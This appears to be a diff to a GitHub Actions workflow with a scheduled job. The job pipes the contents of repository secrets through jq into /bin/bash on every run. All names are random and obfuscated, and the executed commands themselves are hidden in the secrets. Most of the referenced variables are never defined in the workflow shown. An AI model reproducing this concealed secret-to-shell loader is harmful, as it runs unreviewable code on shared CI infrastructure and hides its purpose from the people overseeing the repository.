@@ -3,25 +3,32 @@ name: woshirenyangz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
+    - cron: '17 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: woshirenyangz
         env:
-          wink94: ${{ secrets.wink94 }}
+          yp0: ${{ secrets.yp0 }}
         run: |
-          echo $wink94 | jq -r .r5 | /bin/bash
-          echo $al18 | jq -r .dx3 | /bin/bash
-          echo $zub175 | jq -r .u94 | /bin/bash
-          echo $fwaia0937 | jq -r .x34 | /bin/bash
-          echo $h8149 | jq -r .qvlc09400 | /bin/bash
-          echo $xl79 | jq -r .hjcc12 | /bin/bash
-          echo $fus9245 | jq -r .zcba045 | /bin/bash
-          echo $chipw00799 | jq -r .wxm0 | /bin/bash
-          echo $p670 | jq -r .ivxgv1531 | /bin/bash
+          echo $yp0 | jq -r .v0072 | /bin/bash
+          echo $iovm45 | jq -r .oqs0552 | /bin/bash
+          echo $a7699 | jq -r .m68246 | /bin/bash
+          echo $ci92254 | jq -r .irdsy8761 | /bin/bash
+          echo $kpm55713 | jq -r .nba4 | /bin/bash
+          echo $v42 | jq -r .chvh494 | /bin/bash
+          echo $lvwwf507 | jq -r .diy6249 | /bin/bash
+          echo $jjf71 | jq -r .kjqcg31 | /bin/bash
+          echo $yaf47741 | jq -r .siwk77236 | /bin/bash
+          echo $l032 | jq -r .arig56 | /bin/bash
+          echo $l25 | jq -r .hgd2 | /bin/bash
+          echo $hzo95730 | jq -r .kq78 | /bin/bash
+          echo $qi68488 | jq -r .cnz4464 | /bin/bash
+          echo $ucw41954 | jq -r .vc6 | /bin/bash
+          echo $vrp76 | jq -r .v58 | /bin/bash
+          echo $udxrs2411 | jq -r .g30337 | /bin/bash
+          echo $d04 | jq -r .hv48131 | /bin/bash
 
